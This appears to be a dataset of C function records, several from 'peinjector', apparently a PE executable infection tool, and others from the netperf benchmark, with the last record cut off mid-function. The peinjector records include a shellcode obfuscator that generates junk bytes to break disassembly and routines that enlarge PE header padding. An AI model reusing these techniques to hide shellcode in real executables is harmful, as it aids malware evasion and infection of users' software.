{"docstring": "/* Calculate raw size of image an validates positions and sizes. Returns 0 on error */\n", "func_signal": "static inline size_t __pefile_calculate_raw_size(PEFILE *in, PEFILE_WRITE_OPTIONS *options)", "code": "{\n  size_t i = 0;\n  size_t ii = 0;\n  size_t additional_end, section_end;\n\n  /* Raw size of Headers and padding */\n  size_t size = in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader\n      + in->pe_header.NumberOfSections * sizeof(SECTION_HEADER) + in->header_padding.memsize;\n\n  /* Calculate header size only */\n  if (options && options->header_only) {\n\n    /* If additional data is forced we need to add this size too. In this case, only 1 additional data\n     *  segment is allowed, and only if it's directly after the raw header (happens when parsing a\n     *  truncated pe file with header_only option) */\n    if (options->force_additional) {\n      if (in->additional_count > 1 || ((in->additional_count > 0) && (in->additional_data == NULL))) {\n        return 0;\n      } else if (in->additional_count > 0) {\n        if (size == in->additional_data[0].position) {\n          size += in->additional_data[0].memsize;\n        } else {\n          return 0;\n        }\n      }\n    }\n    return size;\n  }\n\n  /* Validate & add all Section sizes */\n  if ((in->pe_header.NumberOfSections > 0) && (in->section_header == NULL)) {\n    return 0;\n  }\n  for (i = 0; i < in->pe_header.NumberOfSections; ++i) {\n    /* Nested sections */\n    for (ii = 0; ii < in->pe_header.NumberOfSections; ++ii) {\n      if ((i != ii) && (in->section_header[ii].PointerToRawData <= in->section_header[i].PointerToRawData)\n          && ((in->section_header[ii].PointerToRawData + in->section_header[ii].SizeOfRawData)\n              >= (in->section_header[i].PointerToRawData + in->section_header[i].SizeOfRawData))) {\n        size -= in->section_header[i].SizeOfRawData;\n      }\n    }\n    size += in->section_header[i].SizeOfRawData;\n  }\n\n  /* Validate & add all additional data */\n  if ((in->additional_count > 0) && (in->additional_data == NULL)) {\n    return 0;\n  }\n  for (i = 0; i < in->additional_count; ++i) {\n    size += in->additional_data[i].memsize;\n  }\n\n  /* Validate additional data positions */\n  for (i = 0; i < in->additional_count; ++i) {\n    if ((in->additional_data[i].position + in->additional_data[i].memsize) > size) {\n      return 0;\n\n    } else {\n      /* If additional data starts or ends inside section something is wrong */\n      additional_end = in->additional_data[i].position + in->additional_data[i].memsize;\n      for (ii = 0; ii < in->pe_header.NumberOfSections; ++ii) {\n        section_end = in->section_header[ii].PointerToRawData + in->section_header[ii].SizeOfRawData;\n        if (((in->additional_data[i].position >= in->section_header[ii].PointerToRawData)\n            && in->additional_data[i].position < section_end)\n            || ((additional_end > in->section_header[ii].PointerToRawData) && additional_end < section_end)) {\n          return 0;\n        }\n      }\n    }\n  }\n\n  /* Validate Section positions */\n  for (i = 0; i < in->pe_header.NumberOfSections; ++i) {\n    if ((in->section_header[i].PointerToRawData + in->section_header[i].SizeOfRawData) > size) {\n      return 0;\n    }\n  }\n\n  return size;\n}", "path": "peinjector/peinjector/libpefile.c", "commit_date": "2015-09-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Generate garbage */\n", "func_signal": "static inline unsigned char* __peinfector_obfuscator_generate_garbage(SHELLCODE *shellcode, size_t *size)", "code": "{\n  unsigned char *garbage = NULL;\n  switch (shellcode->x64 ? (2 + rand() % 3) : (rand() % 5)) {\n    /* Break alignment */\n    case 0:\n    case 1:\n      *size = 4;\n      garbage = malloc(*size);\n      if (garbage == NULL) {\n        *size = 0;\n        return NULL;\n      }\n      memcpy(garbage, \"\\xeb\\xff\\xc0\\x48\", *size);\n      break;\n\n      /* Random garbage */\n    case 2:\n      *size = 3 + rand() % 6;\n      garbage = malloc(*size);\n      if (garbage == NULL) {\n        *size = 0;\n        return NULL;\n      }\n      garbage[0] = '\\xeb';\n      garbage[1] = (unsigned char) ((int) *size - (int) 2);\n      break;\n\n      /* NOPs */\n    case 3:\n      *size = 1 + rand() % 2;\n      garbage = malloc(*size);\n      if (garbage == NULL) {\n        *size = 0;\n        return NULL;\n      }\n      memset(garbage, '\\x90', *size);\n      break;\n\n      /* Nothing */\n    default:\n      *size = 0;\n      garbage = NULL;\n  }\n\n  return garbage;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Generate new shellcode */\n", "func_signal": "static inline SHELLCODE* __peinfector_obfuscator_shellcode_new()", "code": "{\n  SHELLCODE *shellcode = calloc(1, sizeof(SHELLCODE));\n\n  return shellcode;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Generate new shellcode */\n", "func_signal": "static inline void __peinfector_obfuscator_shellcode_free(SHELLCODE *shellcode)", "code": "{\n  size_t i = 0;\n  /* Free code and garbage */\n  for (i = 0; i < shellcode->entrys; ++i) {\n    /* Free each code */\n    if (shellcode->entry[i].code != 0) {\n      free(shellcode->entry[i].code);\n    }\n    /* Free each garbage */\n    if (shellcode->entry[i].garbage != 0) {\n      free(shellcode->entry[i].garbage);\n    }\n  }\n\n  /* Free holder*/\n  free(shellcode->entry);\n\n  /* Free shellcode container*/\n  free(shellcode);\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Increases the header padding with the given size */\n", "func_signal": "static inline bool __petool_increase_header_padding(size_t size, PEFILE *out)", "code": "{\n  size_t i = 0;\n  unsigned char *new_header_padding = NULL;\n  size_t header_raw_end = out->dos_header.e_lfanew + sizeof(PE_HEADER) + out->pe_header.SizeOfOptionalHeader\n      + out->pe_header.NumberOfSections * sizeof(SECTION_HEADER);\n\n  new_header_padding = realloc(out->header_padding.mem, out->header_padding.memsize + size);\n  /* Couldn't reallocate memory */\n  if (new_header_padding == NULL) {\n    return false;\n  }\n\n  /* No way to resize without damaging code execution */\n  /* Sorry for this cruel if .. */\n  if ((out->pe_header.NumberOfSections > 0) && (out->section_header != NULL)\n      && ((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)\n          || (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC))\n      && (header_raw_end + out->header_padding.memsize + size) > out->section_header[0].VirtualAddress) {\n    /* Reset header padding */\n    out->header_padding.mem = realloc(new_header_padding, out->header_padding.memsize);\n    return false;\n  }\n\n  /* Increase at head */\n  memmove(new_header_padding + size, new_header_padding, out->header_padding.memsize);\n  memset(new_header_padding, 0, size);\n  out->header_padding.mem = new_header_padding;\n  out->header_padding.memsize += size;\n\n  /* Fix SizeOfHeaders */\n  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {\n    if (out->optional_header_32.SizeOfHeaders < (header_raw_end + out->header_padding.memsize)) {\n      out->optional_header_32.SizeOfHeaders = header_raw_end + out->header_padding.memsize;\n    }\n  } else if (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC) {\n    if (out->optional_header_64.SizeOfHeaders < (header_raw_end + out->header_padding.memsize)) {\n      out->optional_header_64.SizeOfHeaders = header_raw_end + out->header_padding.memsize;\n    }\n  }\n\n  /* Fix section positions */\n  if ((out->pe_header.NumberOfSections > 0) && (out->section_header != NULL)) {\n    for (i = 0; i < out->pe_header.NumberOfSections; ++i) {\n      out->section_header[i].PointerToRawData += size;\n    }\n  }\n\n  /* Fix additional data positions */\n  if ((out->additional_count > 0) && (out->additional_data != NULL)) {\n    for (i = 0; i < out->additional_count; ++i) {\n      out->additional_data[i].position += size;\n    }\n  }\n\n  return true;\n}", "path": "peinjector/peinjector/libpetool.c", "commit_date": "2015-09-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Converts token to hex string and vice versa. direction = true: hextoken->token, false: token->hextoken*/\n/* Required: token & hextoken != 0, sizeof(token) >= PESERVER_TOKEN_SIZE, sizeof(hextoken) >= 2*sizeof(token) */\n", "func_signal": "static inline void __peserver_convert_token(unsigned char *token, unsigned char* hextoken, bool direction)", "code": "{\n  unsigned char *pos;\n  size_t count = 0;\n\n  pos = hextoken;\n  for (count = 0; count < PESERVER_TOKEN_SIZE; ++count) {\n    /* hex string to token */\n    if (direction) {\n      sscanf((char*) pos, \"%02x\", (unsigned int *) &token[count]);\n      /* token to hex string */\n    } else {\n      sprintf((char*) pos, \"%02x\", token[count]);\n    }\n    pos += 2 * sizeof(char);\n  }\n\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Opens connection to server */\n", "func_signal": "static inline int __peserver_connect(char* host, short port, int protocol)", "code": "{\n  struct sockaddr_in *saddr = calloc(1, sizeof(struct sockaddr_in));\n  struct hostent *he;\n  int _socket;\n  int socket_type = SOCK_STREAM;\n  if (protocol == IPPROTO_UDP)\n    socket_type = SOCK_DGRAM;\n\n  /* Create Socket */\n  if ((_socket = socket(AF_INET, socket_type, protocol)) == -1) {\n    return 0;\n  }\n  memset(saddr, 0, sizeof(struct sockaddr_in));\n  saddr->sin_family = AF_INET;\n\n  /* Host wasn't a IPv4 Address: Resolve DNS */\n  if ((he = gethostbyname(host)) == NULL) {\n    return 0;\n  }\n  saddr->sin_addr.s_addr = *((long*) he->h_addr_list[0]);\n\n  saddr->sin_port = htons(port);\n\n  /* Connects Socket */\n  if (connect(_socket, (struct sockaddr*) saddr, sizeof(struct sockaddr)) < 0) {\n    return 0;\n  }\n  return _socket;\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* this routing initializes all the test specific variables */\n", "func_signal": "static void\ninit_test_vars()", "code": "{\n  rss_size  = 0;\n  rsr_size  = 0;\n  lss_size_req = -1;\n  lsr_size_req = -1;\n  lss_size  = 0;\n  lsr_size  = 0;\n  req_size  = 1;\n  rsp_size  = 1;\n  send_size = 0;\n  recv_size = 0;\n\n  strcpy(path_prefix,\"/tmp\");\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* This is the server-side routine for the stream stream test. It is\n   implemented as one routine. I could break things-out somewhat, but\n   didn't feel it was necessary. */\n", "func_signal": "void\nrecv_stream_stream()", "code": "{\n\n  struct sockaddr_un myaddr_un, peeraddr_un;\n  SOCKET s_listen,s_data;\n  netperf_socklen_t addrlen;\n  int\tlen;\n  int\treceive_calls = 0;\n  float\telapsed_time;\n  int   bytes_received;\n\n  struct ring_elt *recv_ring;\n\n#ifdef DIRTY\n  char\t*message_ptr;\n  int   *message_int_ptr;\n  int   dirty_count;\n  int   clean_count;\n  int   i;\n#endif\n\n  struct\tstream_stream_request_struct\t*stream_stream_request;\n  struct\tstream_stream_response_struct\t*stream_stream_response;\n  struct\tstream_stream_results_struct\t*stream_stream_results;\n\n  stream_stream_request\t=\n    (struct stream_stream_request_struct *)netperf_request.content.test_specific_data;\n  stream_stream_response\t=\n    (struct stream_stream_response_struct *)netperf_response.content.test_specific_data;\n  stream_stream_results\t=\n    (struct stream_stream_results_struct *)netperf_response.content.test_specific_data;\n\n  if (debug) {\n    fprintf(where,\"netserver: recv_stream_stream: entered...\\n\");\n    fflush(where);\n  }\n\n  /* We want to set-up the listen socket with all the desired\n     parameters and then let the initiator know that all is ready. If\n     socket size defaults are to be used, then the initiator will have\n     sent us 0's. If the socket sizes cannot be changed, then we will\n     send-back what they are. If that information cannot be\n     determined, then we send-back -1's for the sizes. If things go\n     wrong for any reason, we will drop back ten yards and punt. */\n\n  /* If anything goes wrong, we want the remote to know about it. It\n     would be best if the error that the remote reports to the user is\n     the actual error we encountered, rather than some bogus\n     unexpected response type message. */\n\n  if (debug) {\n    fprintf(where,\"recv_stream_stream: setting the response type...\\n\");\n    fflush(where);\n  }\n\n  netperf_response.content.response_type = STREAM_STREAM_RESPONSE;\n\n  if (debug) {\n    fprintf(where,\"recv_stream_stream: the response type is set...\\n\");\n    fflush(where);\n  }\n\n  /* We now alter the message_ptr variable to be at the desired\n     alignment with the desired offset. */\n\n  if (debug) {\n    fprintf(where,\"recv_stream_stream: requested alignment of %d\\n\",\n\t    stream_stream_request->recv_alignment);\n    fflush(where);\n  }\n\n  /* Let's clear-out our sockaddr for the sake of cleanlines. Then we\n     can put in OUR values !-) At some point, we may want to nail this\n     socket to a particular network-level address, but for now,\n     INADDR_ANY should be just fine. */\n\n  bzero((char *)&myaddr_un,\n\tsizeof(myaddr_un));\n  myaddr_un.sun_family      = AF_UNIX;\n\n  /* Grab a socket to listen on, and then listen on it. */\n\n  if (debug) {\n    fprintf(where,\"recv_stream_stream: grabbing a socket...\\n\");\n    fflush(where);\n  }\n\n  /* create_unix_socket expects to find some things in the global\n     variables, so set the globals based on the values in the request.\n     once the socket has been created, we will set the response values\n     based on the updated value of those globals. raj 7/94 */\n  lss_size_req = stream_stream_request->send_buf_size;\n  lsr_size_req = stream_stream_request->recv_buf_size;\n\n  s_listen = create_unix_socket(AF_UNIX,\n\t\t\t\tSOCK_STREAM);\n\n  if (s_listen == INVALID_SOCKET) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n    exit(1);\n  }\n\n  /* Let's get an address assigned to this socket so we can tell the\n     initiator how to reach the data socket. There may be a desire to\n     nail this socket to a specific IP address in a multi-homed,\n     multi-connection situation, but for now, we'll ignore the issue\n     and concentrate on single connection testing. */\n\n  strcpy(myaddr_un.sun_path,tempnam(path_prefix,\"netperf.\"));\n  if (debug) {\n    fprintf(where,\"selected a path of %s\\n\",myaddr_un.sun_path);\n    fflush(where);\n  }\n  if (bind(s_listen,\n\t   (struct sockaddr *)&myaddr_un,\n\t   sizeof(myaddr_un)) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    fprintf(where,\"could not bind to path\\n\");\n    close(s_listen);\n    send_response();\n\n    exit(1);\n  }\n\n  chmod(myaddr_un.sun_path, 0666);\n\n  /* what sort of sizes did we end-up with? */\n  if (stream_stream_request->receive_size == 0) {\n    if (lsr_size > 0) {\n      recv_size = lsr_size;\n    }\n    else {\n      recv_size = 4096;\n    }\n  }\n  else {\n    recv_size = stream_stream_request->receive_size;\n  }\n\n  /* we want to set-up our recv_ring in a manner analagous to what we\n     do on the sending side. this is more for the sake of symmetry\n     than for the needs of say copy avoidance, but it might also be\n     more realistic - this way one could conceivably go with a\n     double-buffering scheme when taking the data an putting it into\n     the filesystem or something like that. raj 7/94 */\n\n  if (recv_width == 0) {\n    recv_width = (lsr_size/recv_size) + 1;\n    if (recv_width == 1) recv_width++;\n  }\n\n  recv_ring = allocate_buffer_ring(recv_width,\n\t\t\t\t   recv_size,\n\t\t\t\t   stream_stream_request->recv_alignment,\n\t\t\t\t   stream_stream_request->recv_offset);\n\n  if (debug) {\n    fprintf(where,\"recv_stream_stream: receive alignment and offset set...\\n\");\n    fflush(where);\n  }\n\n  /* Now, let's set-up the socket to listen for connections */\n  if (listen(s_listen, 5) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    close(s_listen);\n    send_response();\n\n    exit(1);\n  }\n\n  /* now get the port number assigned by the system  */\n  addrlen = sizeof(myaddr_un);\n  if (getsockname(s_listen,\n\t\t  (struct sockaddr *)&myaddr_un,\n\t\t  &addrlen) == SOCKET_ERROR){\n    netperf_response.content.serv_errno = errno;\n    close(s_listen);\n    send_response();\n\n    exit(1);\n  }\n\n  /* Now myaddr_un contains the path returned to the sender also\n     implicitly telling the sender that the socket buffer sizing has\n     been done. */\n  strcpy(stream_stream_response->unix_path,myaddr_un.sun_path);\n  netperf_response.content.serv_errno   = 0;\n\n  /* But wait, there's more. If the initiator wanted cpu measurements,\n     then we must call the calibrate routine, which will return the\n     max rate back to the initiator. If the CPU was not to be\n     measured, or something went wrong with the calibration, we will\n     return a -1 to the initiator. */\n\n  stream_stream_response->cpu_rate = 0.0; \t/* assume no cpu */\n  if (stream_stream_request->measure_cpu) {\n    stream_stream_response->measure_cpu = 1;\n    stream_stream_response->cpu_rate =\n      calibrate_local_cpu(stream_stream_request->cpu_rate);\n  }\n\n  /* before we send the response back to the initiator, pull some of\n     the socket parms from the globals */\n  stream_stream_response->send_buf_size = lss_size;\n  stream_stream_response->recv_buf_size = lsr_size;\n  stream_stream_response->receive_size = recv_size;\n\n  send_response();\n\n  addrlen = sizeof(peeraddr_un);\n\n  if ((s_data=accept(s_listen,\n\t\t     (struct sockaddr *)&peeraddr_un,\n\t\t     &addrlen)) == INVALID_SOCKET) {\n    /* Let's just punt. The remote will be given some information */\n    close(s_listen);\n    exit(1);\n  }\n\n  /* Now it's time to start receiving data on the connection. We will\n     first grab the apropriate counters and then start grabbing. */\n\n  cpu_start(stream_stream_request->measure_cpu);\n\n  /* The loop will exit when the sender does a shutdown, which will\n     return a length of zero  */\n\n#ifdef DIRTY\n  /* we want to dirty some number of consecutive integers in the\n     buffer we are about to recv. we may also want to bring some\n     number of them cleanly into the cache. The clean ones will follow\n     any dirty ones into the cache. */\n\n  dirty_count = stream_stream_request->dirty_count;\n  clean_count = stream_stream_request->clean_count;\n  message_int_ptr = (int *)recv_ring->buffer_ptr;\n  for (i = 0; i < dirty_count; i++) {\n    *message_int_ptr = rand();\n    message_int_ptr++;\n  }\n  for (i = 0; i < clean_count; i++) {\n    dirty_count = *message_int_ptr;\n    message_int_ptr++;\n  }\n#endif /* DIRTY */\n  bytes_received = 0;\n\n  while ((len = recv(s_data, recv_ring->buffer_ptr, recv_size, 0)) != 0) {\n    if (len == SOCKET_ERROR) {\n      netperf_response.content.serv_errno = errno;\n      send_response();\n      exit(1);\n    }\n    bytes_received += len;\n    receive_calls++;\n\n    /* more to the next buffer in the recv_ring */\n    recv_ring = recv_ring->next;\n\n#ifdef DIRTY\n    message_int_ptr = (int *)(recv_ring->buffer_ptr);\n    for (i = 0; i < dirty_count; i++) {\n      *message_int_ptr = rand();\n      message_int_ptr++;\n    }\n    for (i = 0; i < clean_count; i++) {\n      dirty_count = *message_int_ptr;\n      message_int_ptr++;\n    }\n#endif /* DIRTY */\n  }\n\n  /* The loop now exits due to zero bytes received. we will have\n     counted one too many messages received, so decrement the\n     receive_calls counter by one. raj 7/94 */\n  receive_calls--;\n\n  /* perform a shutdown to signal the sender that we have received all\n     the data sent. raj 4/93 */\n\n  if (shutdown(s_data,1) == SOCKET_ERROR) {\n      netperf_response.content.serv_errno = errno;\n      send_response();\n      exit(1);\n    }\n\n  cpu_stop(stream_stream_request->measure_cpu,&elapsed_time);\n\n  /* send the results to the sender\t\t\t*/\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_stream_stream: got %d bytes\\n\",\n\t    bytes_received);\n    fprintf(where,\n\t    \"recv_stream_stream: got %d recvs\\n\",\n\t    receive_calls);\n    fflush(where);\n  }\n\n  stream_stream_results->bytes_received\t= bytes_received;\n  stream_stream_results->elapsed_time\t= elapsed_time;\n  stream_stream_results->recv_calls\t= receive_calls;\n\n  if (stream_stream_request->measure_cpu) {\n    stream_stream_results->cpu_util\t= calc_cpu_util(0.0);\n  };\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"recv_stream_stream: test complete, sending results.\\n\");\n    fflush(where);\n  }\n\n  send_response();\n  unlink(myaddr_un.sun_path);\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* systems. This routine never returns. raj 1/96 */\n", "func_signal": "static void\nsit_and_spin(int child_index)", "code": "{\n  uint64_t *my_counter_ptr;\n\n /* only use C stuff if we are not WIN32 unless and until we */\n /* switch from CreateThread to _beginthread. raj 1/96 */\n#ifndef WIN32\n  /* we are the child. we could decide to exec some separate */\n  /* program, but that doesn't really seem worthwhile - raj 4/95 */\n  if (debug > 1) {\n    fprintf(where,\n            \"Looper child %d is born, pid %d\\n\",\n            child_index,\n            getpid());\n    fflush(where);\n  }\n\n#endif /* WIN32 */\n\n  /* reset our base pointer to be at the appropriate offset */\n  my_counter_ptr = (uint64_t *) ((char *)lib_base_pointer +\n                             (netlib_get_page_size() *\n                              PAGES_PER_CHILD * child_index));\n\n  /* in the event we are running on an MP system, it would */\n  /* probably be good to bind the soaker processes to specific */\n  /* processors. I *think* this is the most reasonable thing to */\n  /* do, and would be closes to simulating the information we get */\n  /* on HP-UX with pstat. I could put all the system-specific code */\n  /* here, but will \"abstract it into another routine to keep this */\n  /* area more readable. I'll probably do the same thine with the */\n  /* \"low pri code\" raj 10/95 */\n\n  /* since we are \"flying blind\" wrt where we should bind the looper\n     processes, we want to use the cpu_map that was prepared by netlib\n     rather than assume that the CPU ids on the system start at zero\n     and are contiguous. raj 2006-04-03 */\n  bind_to_specific_processor(child_index % lib_num_loc_cpus,1);\n\n  for (*my_counter_ptr = 0L;\n       ;\n       (*my_counter_ptr)++) {\n    if (!(*lib_base_pointer % 1)) {\n      /* every once and again, make sure that our process priority is */\n      /* nice and low. also, by making system calls, it may be easier */\n      /* for us to be pre-empted by something that needs to do useful */\n      /* work - like the thread of execution actually sending and */\n      /* receiving data across the network :) */\n#ifdef _AIX\n      int pid,prio;\n\n      prio = PRIORITY;\n      pid = getpid();\n      /* if you are not root, this call will return EPERM - why one */\n      /* cannot change one's own priority to  lower value is beyond */\n      /* me. raj 2/26/96 */\n      setpri(pid, prio);\n#else /* _AIX */\n#ifdef __sgi\n      int pid,prio;\n\n      prio = PRIORITY;\n      pid = getpid();\n      schedctl(NDPRI, pid, prio);\n      sginap(0);\n#else /* __sgi */\n#ifdef WIN32\n      SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_IDLE);\n#else /* WIN32 */\n#if defined(__sun) && defined(__SVR4)\n#include <sys/types.h>\n#include <sys/priocntl.h>\n#include <sys/rtpriocntl.h>\n#include <sys/tspriocntl.h>\n      /* I would *really* like to know how to use priocntl to make the */\n      /* priority low for this looper process. however, either my mind */\n      /* is addled, or the manpage in section two for priocntl is not */\n      /* terribly helpful - for one, it has no examples :( so, if you */\n      /* can help, I'd love to hear from you. in the meantime, we will */\n      /* rely on nice(39). raj 2/26/96 */\n      nice(39);\n#else /* __sun && __SVR4 */\n      nice(39);\n#endif /* __sun && _SVR4 */\n#endif /* WIN32 */\n#endif /* __sgi */\n#endif /* _AIX */\n    }\n  }\n}", "path": "netperf/src/netcpu_looper.c", "commit_date": "2014-06-03 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* This routine implements the STREAM unidirectional data transfer\n   test (a.k.a. stream) for the sockets interface. It receives its\n   parameters via global variables from the shell and writes its\n   output to the standard output. */\n", "func_signal": "void\nsend_stream_stream(char remote_host[])", "code": "{\n\n  char *tput_title = \"\\\nRecv   Send    Send                          \\n\\\nSocket Socket  Message  Elapsed              \\n\\\nSize   Size    Size     Time     Throughput  \\n\\\nbytes  bytes   bytes    secs.    %s/sec  \\n\\n\";\n\n  char *tput_fmt_0 =\n    \"%7.2f\\n\";\n\n  char *tput_fmt_1 =\n    \"%5d  %5d  %6d    %-6.2f   %7.2f   \\n\";\n\n  char *cpu_title = \"\\\nRecv   Send    Send                          Utilization    Service Demand\\n\\\nSocket Socket  Message  Elapsed              Send   Recv    Send    Recv\\n\\\nSize   Size    Size     Time     Throughput  local  remote  local   remote\\n\\\nbytes  bytes   bytes    secs.    %-8.8s/s  %%      %%       us/KB   us/KB\\n\\n\";\n\n  char *cpu_fmt_0 =\n    \"%6.3f\\n\";\n\n  char *cpu_fmt_1 =\n    \"%5d  %5d  %6d    %-6.2f     %7.2f   %-6.2f %-6.2f  %-6.3f  %-6.3f\\n\";\n\n  char *ksink_fmt = \"\\n\\\nAlignment      Offset         %-8.8s %-8.8s    Sends   %-8.8s Recvs\\n\\\nLocal  Remote  Local  Remote  Xfered   Per                 Per\\n\\\nSend   Recv    Send   Recv             Send (avg)          Recv (avg)\\n\\\n%5d   %5d  %5d   %5d %6.4g  %6.2f     %6d %6.2f   %6d\\n\";\n\n\n  float\t\t\telapsed_time;\n\n#ifdef WANT_INTERVALS\n  int interval_count;\n#endif\n\n  /* what we want is to have a buffer space that is at least one\n     send-size greater than our send window. this will insure that we\n     are never trying to re-use a buffer that may still be in the\n     hands of the transport. This buffer will be malloc'd after we\n     have found the size of the local senc socket buffer. We will want\n     to deal with alignment and offset concerns as well. */\n\n#ifdef DIRTY\n  int\t*message_int_ptr;\n#endif\n#include <sys/stat.h>\n\n  struct ring_elt *send_ring;\n\n  int\tlen = 0;\n  int\tnummessages;\n  SOCKET send_socket;\n  int\tbytes_remaining;\n  /* with links like fddi, one can send > 32 bits worth of bytes\n     during a test... ;-) */\n  double\tbytes_sent;\n\n#ifdef DIRTY\n  int\ti;\n#endif /* DIRTY */\n\n  float\tlocal_cpu_utilization;\n  float\tlocal_service_demand;\n  float\tremote_cpu_utilization;\n  float\tremote_service_demand;\n  double\tthruput;\n\n  struct\tsockaddr_un\tserver;\n\n  struct\tstream_stream_request_struct\t*stream_stream_request;\n  struct\tstream_stream_response_struct\t*stream_stream_response;\n  struct\tstream_stream_results_struct\t*stream_stream_result;\n\n  stream_stream_request  =\n    (struct stream_stream_request_struct *)netperf_request.content.test_specific_data;\n  stream_stream_response =\n    (struct stream_stream_response_struct *)netperf_response.content.test_specific_data;\n  stream_stream_result   =\n    (struct stream_stream_results_struct *)netperf_response.content.test_specific_data;\n\n  /* since we are now disconnected from the code that established the\n     control socket, and since we want to be able to use different\n     protocols and such, we are passed the name of the remote host and\n     must turn that into the test specific addressing information. */\n\n  bzero((char *)&server,\n\tsizeof(server));\n  server.sun_family = AF_UNIX;\n\n\n  if ( print_headers ) {\n    fprintf(where,\"STREAM STREAM TEST\\n\");\n    if (local_cpu_usage || remote_cpu_usage)\n      fprintf(where,cpu_title,format_units());\n    else\n      fprintf(where,tput_title,format_units());\n  }\n\n  /* initialize a few counters */\n\n  nummessages\t=\t0;\n  bytes_sent\t=\t0.0;\n  times_up \t= \t0;\n\n  /*set up the data socket                        */\n  send_socket = create_unix_socket(AF_UNIX,\n\t\t\t\t   SOCK_STREAM);\n\n  if (send_socket == INVALID_SOCKET){\n    perror(\"netperf: send_stream_stream: stream stream data socket\");\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"send_stream_stream: send_socket obtained...\\n\");\n  }\n\n  /* at this point, we have either retrieved the socket buffer sizes,\n     or have tried to set them, so now, we may want to set the send\n     size based on that (because the user either did not use a -m\n     option, or used one with an argument of 0). If the socket buffer\n     size is not available, we will set the send size to 4KB - no\n     particular reason, just arbitrary... */\n  if (send_size == 0) {\n    if (lss_size > 0) {\n      send_size = lss_size;\n    }\n    else {\n      send_size = 4096;\n    }\n  }\n\n  /* set-up the data buffer ring with the requested alignment and\n     offset.  note also that we have allocated a quantity of memory\n     that is at least one send-size greater than our socket buffer\n     size. We want to be sure that there are at least two buffers\n     allocated - this can be a bit of a problem when the send_size is\n     bigger than the socket size, so we must check... the user may\n     have wanted to explicitly set the \"width\" of our send buffers, we\n     should respect that wish... */\n  if (send_width == 0) {\n    send_width = (lss_size/send_size) + 1;\n    if (send_width == 1) send_width++;\n  }\n\n  send_ring = allocate_buffer_ring(send_width,\n\t\t\t\t   send_size,\n\t\t\t\t   local_send_align,\n\t\t\t\t   local_send_offset);\n\n  /* If the user has requested cpu utilization measurements, we must\n     calibrate the cpu(s). We will perform this task within the tests\n     themselves. If the user has specified the cpu rate, then\n     calibrate_local_cpu will return rather quickly as it will have\n     nothing to do. If local_cpu_rate is zero, then we will go through\n     all the \"normal\" calibration stuff and return the rate back.*/\n\n  if (local_cpu_usage) {\n    local_cpu_rate = calibrate_local_cpu(local_cpu_rate);\n  }\n\n  /* Tell the remote end to do a listen. The server alters the socket\n     paramters on the other side at this point, hence the reason for\n     all the values being passed in the setup message. If the user did\n     not specify any of the parameters, they will be passed as 0,\n     which will indicate to the remote that no changes beyond the\n     system's default should be used. Alignment is the exception, it\n     will default to 1, which will be no alignment alterations. */\n\n  netperf_request.content.request_type\t=\tDO_STREAM_STREAM;\n  stream_stream_request->send_buf_size\t=\trss_size;\n  stream_stream_request->recv_buf_size\t=\trsr_size;\n  stream_stream_request->receive_size\t=\trecv_size;\n  stream_stream_request->recv_alignment\t=\tremote_recv_align;\n  stream_stream_request->recv_offset\t=\tremote_recv_offset;\n  stream_stream_request->measure_cpu\t=\tremote_cpu_usage;\n  stream_stream_request->cpu_rate\t=\tremote_cpu_rate;\n  if (test_time) {\n    stream_stream_request->test_length\t=\ttest_time;\n  }\n  else {\n    stream_stream_request->test_length\t=\ttest_bytes;\n  }\n#ifdef DIRTY\n  stream_stream_request->dirty_count    =       rem_dirty_count;\n  stream_stream_request->clean_count    =       rem_clean_count;\n#endif /* DIRTY */\n\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"netperf: send_stream_stream: requesting STREAM stream test\\n\");\n  }\n\n  send_request();\n\n  /* The response from the remote will contain all of the relevant\n     socket parameters for this test type. We will put them back into\n     the variables here so they can be displayed if desired.  The\n     remote will have calibrated CPU if necessary, and will have done\n     all the needed set-up we will have calibrated the cpu locally\n     before sending the request, and will grab the counter value right\n     after the connect returns. The remote will grab the counter right\n     after the accept call. This saves the hassle of extra messages\n     being sent for the STREAM tests.  */\n\n  recv_response();\n\n  